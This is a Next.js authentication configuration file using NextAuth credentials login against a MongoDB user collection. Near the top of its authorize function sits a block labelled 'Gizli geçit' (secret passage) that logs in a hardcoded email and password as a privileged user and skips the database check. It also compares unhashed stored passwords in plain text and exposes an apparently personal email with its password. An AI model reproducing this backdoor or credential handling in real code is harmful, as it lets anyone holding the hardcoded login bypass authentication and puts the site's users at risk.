// lib/authOptions.ts
import type { NextAuthOptions } from "next-auth";
import CredentialsProvider from "next-auth/providers/credentials";
import mongoose from "mongoose";
import bcrypt from "bcryptjs";

export const authOptions: NextAuthOptions = {
  session: { strategy: "jwt" },
  secret: process.env.NEXTAUTH_SECRET as string,
  pages: { signIn: "/giris" },
  providers: [
    CredentialsProvider({
      name: "Siber Karargah",
      credentials: {
        email: { label: "Email", type: "email" },
        password: { label: "Şifre", type: "password" },
      },
      async authorize(credentials) {
        try {
          const reqEmail = credentials?.email?.toLowerCase() || "";
          const reqPass = credentials?.password || "";

          // Gizli geçit
          if (
            reqEmail === "ercannefes@gmail.com" &&
            reqPass === "siber123"
          ) {
            return { id: "999", email: reqEmail, name: "Patron Ercan" };
          }

          // Veritabanı bağlantısı
          if (mongoose.connection.readyState === 0) {
            await mongoose.connect(process.env.MONGODB_URI as string);
          }

          const db = mongoose.connection.db;
          if (!db) return null;

          const user = await db
            .collection("users")
            .findOne({ email: reqEmail });
          if (!user) return null;

          const dbPass = user.password || user.sifre;
          if (!dbPass) return null;

          let isValid = false;
          if (dbPass.startsWith("$2")) {
            isValid = await bcrypt.compare(reqPass, dbPass);
          } else {
            isValid = dbPass === reqPass;
          }

          if (!isValid) return null;

          return {
            id: user._id.toString(),
            email: user.email,
            name: user.name || reqEmail.split("@")[0],
          };
        } catch (error) {
          console.error("Giriş hatası:", error);
          return null;
        }
      },
    }),
  ],
  callbacks: {
    async session({ session, token }) {
      if (session?.user && token.sub) {
        (session.user as any).id = token.sub;
      }
      return session;
    },
  },
};
